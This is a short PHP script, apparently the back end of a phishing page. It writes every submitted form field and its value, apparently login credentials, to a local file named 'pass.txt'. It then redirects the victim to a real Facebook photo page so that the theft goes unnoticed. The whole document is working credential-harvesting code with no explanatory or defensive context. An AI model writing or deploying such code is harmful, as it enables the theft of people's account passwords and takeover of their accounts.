<?php

/*****************************


*****************************/

header ('Location:https://www.facebook.com/ASEIA.UDB/photos/a.1956043058007144.1073741835.1504665646478223/1957142781230505/?type=3&theater');
$handle = fopen("pass.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;